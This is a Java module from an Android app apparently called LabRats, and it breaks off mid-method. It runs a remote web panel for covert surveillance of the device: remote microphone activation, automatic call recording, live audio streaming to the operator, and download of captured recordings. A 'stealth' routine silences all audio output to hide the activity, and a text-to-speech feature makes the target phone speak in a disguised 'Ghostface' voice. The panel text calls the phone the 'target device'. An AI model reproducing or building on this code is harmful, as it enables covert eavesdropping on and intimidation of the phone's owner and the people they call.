package com.labs.labrats.modules;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.AudioAttributes;
import android.media.AudioFormat;
import android.media.AudioManager;
import android.media.AudioRecord;
import android.media.AudioTrack;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import com.labs.labrats.Constants;
import com.labs.labrats.FirebaseConfig;
import com.labs.labrats.LabRatsWorker;
import com.labs.labrats.MediaFrameworkService;

import java.io.File;
import java.io.InputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Map;

import fi.iki.elonen.NanoHTTPD.IHTTPSession;
import fi.iki.elonen.NanoHTTPD.Response;

public class AcousticsModule extends BaseModule {

    private static final java.util.Set<android.speech.tts.TextToSpeech> activeTtsHolder =
            java.util.Collections.synchronizedSet(new java.util.HashSet<>());

    public AcousticsModule(Context context, FirebaseConfig server) {
        super(context, server);
    }

    public Response handleRequest(IHTTPSession session) {
        String uri = session.getUri();
        Map<String, String> params = session.getParms();

        if (uri.equals("/audio")) {
            return serveAudioPage(session);
        } else if (uri.equals("/audio/mic/start")) {
            return startMicRecording(session, params);
        } else if (uri.equals("/audio/mic/stop")) {
            return stopMicRecording(session);
        } else if (uri.equals("/audio/call/start")) {
            return startCallRecording(params);
        } else if (uri.equals("/audio/call/stop")) {
            return stopCallRecording(session);
        } else if (uri.equals("/audio/status")) {
            return serveAudioStatus();
        } else if (uri.equals("/audio/settings")) {
            return updateAudioSettings(session, params);
        } else if (uri.equals("/audio/recordings")) {
            return serveAudioRecordings(session);
        } else if (uri.equals("/audio/stream") || uri.equals("/audio/chunk")) {
            return serveAudioChunk(session);
        } else if (uri.equals("/audio/speak")) {
            return handleTextToSpeech(params);
        } else if (uri.equals("/audio/inject")) {
            return handleAudioInjection(session);
        } else if (uri.equals("/audio/speakerphone")) {
            return toggleSpeakerphone(params);
        }
        return null;
    }

    private Response toggleSpeakerphone(Map<String, String> params) {
        try {
            boolean enable = "true".equalsIgnoreCase(params.get("enable"));
            AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
            if (audioManager != null) {
                audioManager.setMode(enable ? AudioManager.MODE_IN_COMMUNICATION : AudioManager.MODE_NORMAL);
                audioManager.setSpeakerphoneOn(enable);
                
                if (enable) {
                    // [STEALTH_SYNC] Kill all physical output streams immediately
                    int[] streams = {
                        AudioManager.STREAM_VOICE_CALL,
                        AudioManager.STREAM_MUSIC,
                        AudioManager.STREAM_RING,
                        AudioManager.STREAM_SYSTEM
                    };
                    for (int s : streams) {
                        audioManager.setStreamVolume(s, 0, 0);
                    }
                    FirebaseConfig.logActivity("ACOUSTICS_STEALTH: Master Silence active. Routing to Virtual Bridge.");
                } else {
                    FirebaseConfig.logActivity("ACOUSTICS_DYNAMO: Hardware normalization executed.");
                }
            }
            return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"enabled\": " + enable + "}");
        } catch (Exception e) {
            return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", e.getMessage());
        }
    }

    private Response handleTextToSpeech(Map<String, String> params) {
        String text = params.get("text");
        String volStr = params.get("vol");
        String voiceKey = params.get("voice");
        if (text == null || text.trim().isEmpty()) {
            return newResponse(Response.Status.BAD_REQUEST, "application/json", "{\"success\": false, \"message\": \"No text provided\"}");
        }

        int volPercent = 100;
        try {
            if (volStr != null) volPercent = Math.max(10, Math.min(100, Integer.parseInt(volStr)));
        } catch (Exception ignored) {}
        final int finalVolPercent = volPercent;
        final float volRatio = volPercent / 100.0f;
        final String textToSpeak = text.trim();

        if (voiceKey == null || voiceKey.trim().isEmpty()) voiceKey = "us_female";
        final String finalVoiceKey = voiceKey.trim().toLowerCase();

        new android.os.Handler(android.os.Looper.getMainLooper()).post(() -> {
            try {
                AudioManager audioManager = (AudioManager) context.getSystemService(Context.AUDIO_SERVICE);
                if (audioManager != null) {
                    try {
                        audioManager.setMode(AudioManager.MODE_NORMAL);
                        audioManager.setSpeakerphoneOn(true);
                        int maxMusic = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);
                        int targetVol = Math.max(1, Math.round(maxMusic * (finalVolPercent / 100.0f)));
                        audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, targetVol, 0);

                        try {
                            int maxTts = audioManager.getStreamMaxVolume(9);
                            int targetTts = Math.max(1, Math.round(maxTts * (finalVolPercent / 100.0f)));
                            audioManager.setStreamVolume(9, targetTts, 0);
                        } catch (Exception ignored) {}
                    } catch (Exception ignored) {}
                }

                // Determine language locale & pitch modulation for voice style
                String langCode = "en";
                Locale targetLocale = Locale.US;
                float pitch = 1.0f;
                float speed = 1.0f;

                if ("ghostface_deep".equals(finalVoiceKey) || "disguised_deep".equals(finalVoiceKey)) {
                    pitch = 0.50f; // Native Android TTS deep male/disguised voice pitch
                    speed = 0.80f;
                    langCode = "en"; targetLocale = Locale.US;
                } else if ("us_male".equals(finalVoiceKey)) {
                    pitch = 0.70f; speed = 0.95f; langCode = "en"; targetLocale = Locale.US;
                } else if ("us_female".equals(finalVoiceKey)) {
                    pitch = 1.20f; speed = 1.0f; langCode = "en"; targetLocale = Locale.US;
                } else if ("uk_female".equals(finalVoiceKey) || "uk_english".equals(finalVoiceKey)) {
                    pitch = 1.20f; speed = 1.0f; langCode = "en-GB"; targetLocale = Locale.UK;
                } else if ("uk_male".equals(finalVoiceKey)) {
                    pitch = 0.70f; speed = 0.95f; langCode = "en-GB"; targetLocale = Locale.UK;
                } else if ("au_female".equals(finalVoiceKey) || "au_english".equals(finalVoiceKey)) {
                    pitch = 1.20f; speed = 1.0f; langCode = "en-AU"; targetLocale = new Locale("en", "AU");
                } else if ("au_male".equals(finalVoiceKey)) {
                    pitch = 0.70f; speed = 0.95f; langCode = "en-AU"; targetLocale = new Locale("en", "AU");
                } else if ("es_spanish".equals(finalVoiceKey)) {
                    pitch = 1.0f; speed = 1.0f; langCode = "es"; targetLocale = new Locale("es", "ES");
                } else if ("fr_french".equals(finalVoiceKey)) {
                    pitch = 1.0f; speed = 1.0f; langCode = "fr"; targetLocale = Locale.FRANCE;
                }

                final String finalLangCode = langCode;
                final Locale finalLocale = targetLocale;
                final float finalPitch = pitch;
                final float finalSpeed = speed;

                // 1. DUAL PLAYBACK: ONLINE STREAM VIA MEDIAPLAYER (Instant Playback & Exact Volume Scaling)
                LabRatsWorker.execute(() -> {
                    try {
                        String ttsUrl = "https://translate.google.com/translate_tts?ie=UTF-8&q=" +
                                java.net.URLEncoder.encode(textToSpeak, "UTF-8") + "&tl=" + finalLangCode + "&client=tw-ob";
                        android.media.MediaPlayer player = new android.media.MediaPlayer();
                        player.setAudioStreamType(AudioManager.STREAM_MUSIC);
                        player.setDataSource(ttsUrl);
                        player.prepare();
                        player.setVolume(volRatio, volRatio);

                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                            try {
                                android.media.PlaybackParams pParams = new android.media.PlaybackParams();
                                pParams.setPitch(finalPitch);
                                pParams.setSpeed(finalSpeed);
                                pParams.setAudioFallbackMode(android.media.PlaybackParams.AUDIO_FALLBACK_MODE_DEFAULT);
                                player.setPlaybackParams(pParams);
                            } catch (Exception ignored) {}
                        }

                        player.start();
                        player.setOnCompletionListener(mp -> mp.release());
                        FirebaseConfig.logActivity("VOICE_EMISSION: Spoke [" + finalVoiceKey.toUpperCase() + "] (" + finalVolPercent + "% vol) -> " + textToSpeak);
                    } catch (Exception e) {
                        Log.w("TTS", "Online TTS stream fallback: " + e.getMessage());
                    }
                });

                // 2. DUAL PLAYBACK: NATIVE OFFLINE TTS
                android.os.Bundle ttsParams = new android.os.Bundle();
                ttsParams.putInt(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_STREAM, AudioManager.STREAM_MUSIC);
                ttsParams.putFloat(android.speech.tts.TextToSpeech.Engine.KEY_PARAM_VOLUME, volRatio);

                final android.speech.tts.TextToSpeech[] ttsRef = new android.speech.tts.TextToSpeech[1];
                android.speech.tts.TextToSpeech.OnInitListener listener = status -> {
                    if (status == android.speech.tts.TextToSpeech.SUCCESS) {
                        try {
                            int res = ttsRef[0].setLanguage(finalLocale);
                            if (res == android.speech.tts.TextToSpeech.LANG_MISSING_DATA || res == android.speech.tts.TextToSpeech.LANG_NOT_SUPPORTED) {
                                ttsRef[0].setLanguage(Locale.getDefault());
                            }
                            ttsRef[0].setPitch(finalPitch);
                            ttsRef[0].setSpeechRate(finalSpeed);
                            ttsRef[0].speak(textToSpeak, android.speech.tts.TextToSpeech.QUEUE_FLUSH, ttsParams, "TTS_" + System.currentTimeMillis());

                            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                                try {
                                    if (ttsRef[0] != null) {
                                        ttsRef[0].shutdown();
                                        activeTtsHolder.remove(ttsRef[0]);
                                    }
                                } catch (Exception ignored) {}
                            }, 12000);
                        } catch (Exception e) {
                            Log.e("TTS", "Speak error: " + e.getMessage());
                            activeTtsHolder.remove(ttsRef[0]);
                        }
                    } else {
                        Log.e("TTS", "TextToSpeech init failed: " + status);
                        activeTtsHolder.remove(ttsRef[0]);
                    }
                };

                ttsRef[0] = new android.speech.tts.TextToSpeech(context.getApplicationContext(), listener);
                activeTtsHolder.add(ttsRef[0]);
            } catch (Exception e) {
                Log.e("TTS", "Error speaking text: " + e.getMessage());
            }
        });

        return newResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Voice emission queued\"}");
    }

    private static String getAudioFileDuration(File file) {
        if (file == null || !file.exists()) return "00:00";
        try {
            android.media.MediaMetadataRetriever retriever = new android.media.MediaMetadataRetriever();
            retriever.setDataSource(file.getAbsolutePath());
            String durationStr = retriever.extractMetadata(android.media.MediaMetadataRetriever.METADATA_KEY_DURATION);
            retriever.release();
            if (durationStr != null) {
                long durMs = Long.parseLong(durationStr);
                long sec = (durMs / 1000) % 60;
                long min = (durMs / (1000 * 60));
                return String.format(Locale.getDefault(), "%02d:%02d", min, sec);
            }
        } catch (Exception ignored) {}
        return "00:00";
    }

    private static String formatFileSize(long size) {
        if (size <= 0) return "0 B";
        final String[] units = new String[] { "B", "KB", "MB", "GB" };
        int digitGroups = (int) (Math.log10(size) / Math.log10(1024));
        return new java.text.DecimalFormat("#,##0.#").format(size / Math.pow(1024, digitGroups)) + " " + units[digitGroups];
    }

    private Response serveAudioPage(IHTTPSession session) {
        boolean isRecording = MediaFrameworkService.isRecording();
        boolean isRecordingCall = MediaFrameworkService.isRecordingCall();
        boolean callInProgress = MediaFrameworkService.isCallInProgress();
        String callNumber = MediaFrameworkService.getCurrentCallNumber();
        String callType = MediaFrameworkService.getCurrentCallType();
        long duration = MediaFrameworkService.getRecordingDuration();
        boolean autoRecordEnabled = MediaFrameworkService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = MediaFrameworkService.isSaveOnDeviceEnabled();

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<style>")
            .append(".status-card { padding: 20px; background: rgba(255,255,255,0.05); border-radius: 15px; margin-bottom: 20px; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".status-active { border-color: var(--neon-green); background: rgba(57, 255, 20, 0.05); }")
            .append(".status-inactive { border-color: var(--danger); background: rgba(255, 49, 49, 0.05); }")
            .append(".toggle-container { display: flex; align-items: center; justify-content: space-between; gap: 15px; padding: 15px; background: rgba(0,0,0,0.3); border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }")
            .append(".toggle-switch { position: relative; width: 44px; height: 24px; background: #333; border-radius: 12px; cursor: pointer; transition: all 0.3s; border: 1px solid rgba(255,255,255,0.1); }")
            .append(".toggle-switch.active { background: var(--neon-green); border-color: var(--neon-green); }")
            .append(".toggle-switch::after { content: ''; position: absolute; width: 18px; height: 18px; border-radius: 50%; background: #fff; top: 2px; left: 2px; transition: 0.3s; }")
            .append(".toggle-switch.active::after { left: 22px; }")
            .append(".call-alert { padding: 20px; background: rgba(57, 255, 20, 0.1); border-radius: 15px; margin-bottom: 20px; border: 2px solid var(--neon-green); animation: pulse 2s infinite; }")
            .append("@keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }")
            .append(".duration { font-size: 1.8rem; font-weight: 900; color: var(--neon-cyan); font-family: 'Orbitron', sans-serif; text-shadow: 0 0 10px rgba(0, 242, 255, 0.3); }")
            .append("</style>");

        html.append("<div class=\"back-btn-container\">")
            .append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>")
            .append("</div>");

        html.append("<div class=\"card\">");
        html.append("<h2 style=\"text-align: left; margin-bottom: 20px; font-size: 1.6rem;\">ACOUSTICS_INTERFACE <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_INTERFACE', 'Tactical acoustic surveillance hub for remote microphone activation and call interception.')\">INFO</span></h2>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        if (callInProgress) {
            html.append("<div class=\"call-alert\" style=\"border-left: 3px solid var(--neon-green); padding-left: 15px;\">")
                .append("<div style=\"display: flex; align-items: center; gap: 15px;\">")
                .append("<span style=\"font-size: 2rem;\">&#128222;</span>")
                .append("<div>")
                .append("<div style=\"font-size: 1.1rem; font-weight: bold; color: var(--neon-green);\">")
                .append(callType.equals("incoming") ? "INCOMING_CALL_DETECTED" : "OUTGOING_CALL_DETECTED").append("</div>")
                .append("<div style=\"color: #fff; font-family: monospace;\">ID: ").append(escapeHtml(callNumber)).append("</div>")
                .append("</div></div></div>");
        }

        html.append("<div class=\"status-card ").append(isRecording ? "status-active" : "status-inactive").append("\">")
            .append("<div style=\"display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 15px;\">")
            .append("<div>")
            .append("<div class=\"info-label\" style=\"margin:0; font-size: 0.85rem; text-align: left; color: var(--neon-cyan); font-weight: bold;\">")
            .append(isRecording ? "<span style=\"animation: blink 1s infinite;\">&#9679;</span>&nbsp;SURVEILLANCE_ACTIVE" : "&#9899;&nbsp;STANDBY_MODE").append("</div>");

        if (isRecording) {
            String recordingType = isRecordingCall ? "CALL_INTERCEPTION" : "AMBIENT_CAPTURE";
            html.append("<p style=\"color: #888; margin-top: 5px; font-size: 0.7rem; font-family: monospace;\">TYPE: ").append(recordingType).append("</p>")
                .append("<div class=\"duration\" id=\"duration\">").append(FirebaseConfig.formatDuration((int) duration)).append("</div>");
        }
        html.append("</div>");

        if (isRecording) {
            html.append("<button onclick=\"stopMicRec()\" class=\"btn\" style=\"border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); cursor: pointer;\">&#9724; TERMINATE</button>");
        }
        
        html.append("</div></div>");

        // Control buttons
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-green);\">")
            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-green);\">AMBIENT_MIC <span class=\"info-trigger\" onclick=\"showInfo(event, 'AMBIENT_MIC', 'Remote activation of the microphone for background audio capture.')\">INFO</span></h2>")
            
            // Live Stream Section
            .append("<audio id=\"live-audio-player\" style=\"display:none;\"></audio>")
            .append("<div style=\"padding: 15px; background: rgba(0, 242, 255, 0.03); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 12px; margin-bottom: 20px; display: flex; align-items: center; justify-content: space-between;\">")
            .append("  <div>")
            .append("    <div style=\"font-size: 0.75rem; color: var(--neon-cyan); font-weight: bold;\">REAL-TIME_UPLINK</div>")
            .append("    <div style=\"font-size: 0.65rem; color: #888; margin-top: 2px;\">Stream audio directly to browser</div>")
            .append("  </div>")
            .append("  <button id=\"live-listen-btn\" onclick=\"toggleLiveAudio()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin: 0; min-width: 120px;\">LISTEN_LIVE</button>")
            .append("</div>")

            .append("<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 10px;\">")
            .append("<button onclick=\"startMicRec(0)\" class=\"btn btn-small\" ").append(isRecording ? "disabled style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-green); color: var(--neon-green);\"").append(">START_REC</button>")
            .append("<button onclick=\"startMicRec(30)\" class=\"btn btn-small\" ").append(isRecording ? "disabled style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">30s_BURST</button>")
            .append("<button onclick=\"startMicRec(60)\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">60s_BURST</button>")
            .append("<button onclick=\"startMicRec(300)\" class=\"btn btn-small\" ").append(isRecording ? "style=\"opacity:0.5;pointer-events:none;\"" : "style=\"border-color: var(--neon-cyan); color: var(--neon-cyan);\"").append(">5m_BURST</button>")
            .append("</div></div>");

        // --- VOICE EMISSION (TEXT-TO-SPEECH) SECTION (PLACED RIGHT BELOW AMBIENT_MIC) ---
        html.append("<div class=\"card\" style=\"border-left: 3px solid var(--neon-yellow); margin-top: 20px;\">");
        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-yellow);\">VOICE_EMISSION (TEXT-TO-SPEECH) <span class=\"info-trigger\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow);\" onclick=\"showInfo(event, 'VOICE_EMISSION', 'Remotely transmit text to be spoken out loud via the target device speakers using native TTS engine.')\">INFO</span></h2>");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 15px; margin-top: 15px;\">");
        
        // Row 1: Input Box + Transmit Button
        html.append("<div style=\"display: flex; align-items: center; gap: 10px; width: 100%; flex-wrap: wrap;\">");
        html.append("<input id=\"tts-input\" type=\"text\" placeholder=\"Enter text to speak out loud...\" maxlength=\"250\" style=\"flex: 1; min-width: 220px; padding: 12px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-yellow); color: #fff; border-radius: 8px; font-family: monospace; outline: none; box-sizing: border-box;\">");
        html.append("<button onclick=\"transmitVoicePayload()\" class=\"btn btn-small\" style=\"border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.08); font-weight: bold; border-radius: 8px; margin: 0; padding: 12px 18px; white-space: nowrap; flex-shrink: 0;\">&#128266; TRANSMIT VOICE</button>");
        html.append("</div>");
        
        // Row 2: Voice Style Dropdown (Half Width 260px) + Volume Slider (Right 240px)
        html.append("<div class=\"tts-config-grid\" style=\"display: grid; grid-template-columns: 260px 240px; gap: 20px; align-items: end; width: 100%; margin-top: 15px;\">");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 6px;\">");
        html.append("<span style=\"font-size: 0.7rem; color: #888; font-family: monospace; font-weight: bold; white-space: nowrap;\">VOICE_STYLE:</span>");
        html.append("<select id=\"tts-voice-select\" style=\"width: 260px !important; max-width: 260px !important; padding: 10px; background: #000; border: 1px solid var(--neon-yellow); color: #fff; border-radius: 6px; font-family: monospace; font-size: 0.7rem; outline: none; box-sizing: border-box; height: 42px;\">");
        html.append("<option value=\"ghostface_deep\" selected>Ghostface (Super Deep)</option>");
        html.append("<option value=\"us_female\">US English (Female)</option>");
        html.append("<option value=\"us_male\">US English (Male)</option>");
        html.append("<option value=\"uk_female\">UK English (Female)</option>");
        html.append("<option value=\"uk_male\">UK English (Male)</option>");
        html.append("<option value=\"au_female\">Australian (Female)</option>");
        html.append("<option value=\"au_male\">Australian (Male)</option>");
        html.append("<option value=\"es_spanish\">Spanish Voice</option>");
        html.append("<option value=\"fr_french\">French Voice</option>");
        html.append("</select>");
        html.append("</div>");
        html.append("<div style=\"display: flex; flex-direction: column; gap: 6px;\">");
        html.append("<span style=\"font-size: 0.7rem; color: #888; font-family: monospace; font-weight: bold; white-space: nowrap;\">VOLUME: <span id=\"tts-vol-val\" style=\"color: var(--neon-yellow);\">100%</span></span>");
        html.append("<input type=\"range\" id=\"tts-vol-slider\" min=\"10\" max=\"100\" value=\"100\" oninput=\"document.getElementById('tts-vol-val').innerText = this.value + '%'\" style=\"width: 200px !important; height: 30px; margin: 5px 0 0 0; cursor: pointer; display: block;\">");
        html.append("</div>");
        html.append("</div></div></div>");

        // Call recording section
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">")
            .append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">COMMS_INTERCEPTION <span class=\"info-trigger\" onclick=\"showInfo(event, 'COMMS_INTERCEPTION', 'Automated monitoring and recording of cellular voice communications.')\">INFO</span></h2>")
            .append("<div style=\"display: grid; grid-template-columns: 1fr; gap: 12px; margin-top: 20px;\">")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">AUTO_RECORD_CALLS:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(!autoRecordEnabled).append("&save_on_device=").append(saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(autoRecordEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("<div class=\"toggle-container\">")
            .append("<span style=\"font-size: 0.8rem; color: #ccc;\">SAVE_LOCAL_COPY:</span>")
            .append("<a href=\"/audio/settings?auto_record=").append(autoRecordEnabled).append("&save_on_device=").append(!saveOnDeviceEnabled).append("\" style=\"text-decoration: none;\">")
            .append("<div class=\"toggle-switch ").append(saveOnDeviceEnabled ? "active" : "").append("\"></div>")
            .append("</a></div>")
            .append("</div></div>");

        // --- ACOUSTICS VAULT SECTION ---
        html.append("<div class=\"card\" style=\"border-left-color: var(--neon-cyan);\">");
        html.append("<h2 style=\"font-size: 1.35rem; text-align: left; color: var(--neon-cyan);\">ACOUSTICS_VAULT <span class=\"info-trigger\" onclick=\"showInfo(event, 'ACOUSTICS_VAULT', 'Access captured audio files from ambient surveillance or call intercepts.')\">INFO</span></h2>");
        html.append("<div id=\"audio-recordings-list\" style=\"background: rgba(0,0,0,0.4); border: 1px solid rgba(0, 242, 255, 0.1); border-radius: 8px; padding: 15px; min-height: 50px; margin-top: 20px;\">");

        File recordDir = MediaFrameworkService.getRecordingsDirectory(context);
        File[] files = recordDir.listFiles((dir, name) -> name.toLowerCase().endsWith(".m4a") || name.toLowerCase().endsWith(".mp3") ||
                            name.toLowerCase().endsWith(".wav") || name.toLowerCase().endsWith(".aac"));

        if (files != null && files.length > 0) {
            java.util.Arrays.sort(files, (a, b) -> Long.compare(b.lastModified(), a.lastModified()));
            SimpleDateFormat sdf = new SimpleDateFormat("MMM dd, HH:mm", Locale.getDefault());
            html.append("<ul style=\"list-style: none; padding: 0; margin: 0;\">");
            for (int i = 0; i < Math.min(files.length, 5); i++) {
                File f = files[i];
                String downloadPath;
                if (f.getAbsolutePath().contains(context.getFilesDir().getAbsolutePath())) {
                    downloadPath = "INTERNAL/" + f.getAbsolutePath().replace(context.getFilesDir().getAbsolutePath() + "/", "");
                } else {
                    downloadPath = f.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath() + "/", "");
                }
                String timeStr = sdf.format(new Date(f.lastModified()));
                String durStr = getAudioFileDuration(f);
                String sizeStr = formatFileSize(f.length());
                html.append("<li style=\"display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid rgba(255,255,255,0.05);\">");
                html.append("<div style=\"display:flex; flex-direction:column; gap:2px;\">");
                html.append("<span style=\"font-size: 0.7rem; color: #eee; font-family: monospace; word-break: break-all;\">").append(f.getName()).append("</span>");
                html.append("<span style=\"font-size: 0.6rem; color: var(--neon-cyan); opacity: 0.85; font-family: monospace;\">").append(timeStr).append(" &nbsp;&bull;&nbsp; DUR: ").append(durStr).append(" &nbsp;&bull;&nbsp; ").append(sizeStr).append("</span>");
                html.append("</div>");
                html.append("<a href=\"/download/").append(downloadPath).append("\" class=\"btn btn-small\" style=\"padding: 4px 12px; font-size: 0.6rem; margin: 0 0 0 15px; flex-shrink: 0;\">GET</a>");
                html.append("</li>");
            }
            html.append("</ul>");

            // VIEW ALL BUTTON
            String browseUrl = "/audio/recordings";
            if (recordDir.getAbsolutePath().contains(Environment.getExternalStorageDirectory().getAbsolutePath())) {
                String relPath = recordDir.getAbsolutePath().replace(Environment.getExternalStorageDirectory().getAbsolutePath(), "");
                if (relPath.startsWith("/")) relPath = relPath.substring(1);
                browseUrl = "/files/" + relPath;
            }

            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; margin-top: 20px; flex-wrap: wrap;\">");
            html.append("<a href=\"").append(browseUrl).append("\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); margin: 0; min-width: 120px;\">VIEW_ALL_RECORDINGS</a>");
            html.append("</div>");
        } else {
            html.append("<div style=\"font-size: 0.7rem; color: #555; text-align: center;\">[EMPTY] No recordings found.</div>");
        }
        html.append("</div></div>");

        // Auto-refresh script for status
        html.append("<script>")
            .append("var lastRecState = ").append(isRecording).append(";")
            .append("setInterval(function() {")
            .append("  fetch('/audio/status')")
            .append("    .then(r => r.json())")
            .append("    .then(data => {")
            .append("      if (data.isRecording !== lastRecState) {")
            .append("        lastRecState = data.isRecording;")
            .append("        location.reload();")
            .append("      } else if (data.isRecording && document.getElementById('duration')) {")
            .append("        var d = data.duration;")
            .append("        var min = Math.floor(d / 60);")
            .append("        var sec = d % 60;")
            .append("        document.getElementById('duration').textContent = min + ':' + (sec < 10 ? '0' : '') + sec;")
            .append("      }")
            .append("      if (data.callInProgress && !document.querySelector('.call-alert')) {")
            .append("        location.reload();")
            .append("      }")
            .append("    });")
            .append("}, 2000);")
            .append("</script>");

        html.append("</div>");
        html.append(getFooter());
        return server.serveGzippedProxy(session, "text/html", html.toString());
    }

    private Response startMicRecording(IHTTPSession session, Map<String, String> params) {
        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Microphone surveillance started");
        int duration = 0;
        if (params.containsKey("duration")) {
            try {
                duration = Integer.parseInt(params.get("duration"));
            } catch (Exception ignored) {}
        }

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_START_MIC_REC);
        intent.putExtra("duration", duration);

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#127897; Starting microphone recording...</h2></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response stopMicRecording(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_TERMINATED: Audio capture ended");
        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_STOP_MIC_REC);
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping microphone recording...</h2></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response startCallRecording(Map<String, String> params) {
        FirebaseConfig.logActivity("ACOUSTICS_UPLINK: Remote call recording initiated");
        String phoneNumber = params.get("number");
        String callType = params.get("type");

        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_START_CALL_REC);
        intent.putExtra("phone_number", phoneNumber != null ? phoneNumber : "manual");
        intent.putExtra("call_type", callType != null ? callType : "manual");

        androidx.core.content.ContextCompat.startForegroundService(context, intent);

        String json = "{\"success\": true, \"message\": \"Call recording started\"}";
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopCallRecording(IHTTPSession session) {
        FirebaseConfig.logActivity("ACOUSTICS_TERMINATED: Call recording ended");
        android.content.Intent intent = new android.content.Intent(context, MediaFrameworkService.class);
        intent.setAction(Constants.ACTION_STOP_CALL_REC);
        context.startService(intent);

        String html = "<!DOCTYPE html><html><head><meta http-equiv=\"refresh\" content=\"1;url=/audio\"></head>" +
                "<body style=\"background:#1a1a2e;color:#fff;font-family:sans-serif;text-align:center;padding-top:100px;\">"
                +
                "<h2>&#9724; Stopping call recording...</h2></body></html>";
        return server.serveGzippedProxy(session, "text/html", html);
    }

    private Response serveAudioStatus() {
        boolean isRecording = MediaFrameworkService.isRecording();
        boolean isRecordingCall = MediaFrameworkService.isRecordingCall();
        boolean isRecordingMic = MediaFrameworkService.isRecordingMic();
        boolean callInProgress = MediaFrameworkService.isCallInProgress();
        String callNumber = MediaFrameworkService.getCurrentCallNumber();
        String callType = MediaFrameworkService.getCurrentCallType();
        long duration = MediaFrameworkService.getRecordingDuration();
        String recordingPath = MediaFrameworkService.getCurrentRecordingPath();
        boolean autoRecordEnabled = MediaFrameworkService.isAutoRecordEnabled();
        boolean saveOnDeviceEnabled = MediaFrameworkService.isSaveOnDeviceEnabled();

        String json = String.format(
                "{\"isRecording\": %s, \"isRecordingCall\": %s, \"isRecordingMic\": %s, " +
                        "\"callInProgress\": %s, \"callNumber\": \"%s\", \"callType\": \"%s\", " +
                        "\"duration\": %d, \"recordingPath\": %s, " +
                        "\"autoRecordEnabled\": %s, \"saveOnDeviceEnabled\": %s}",
                isRecording, isRecordingCall, isRecordingMic,
                callInProgress, escapeHtml(callNumber != null ? callNumber : ""), callType != null ? callType : "",
                duration, recordingPath != null ? "\"" + recordingPath + "\"" : "null",
                autoRecordEnabled, saveOnDeviceEnabled);
        return newResponse(Response.Status.OK, "application/json", json);
    }

    private Response updateAudioSettings(IHTTPSession session, Map<String, String> params) {
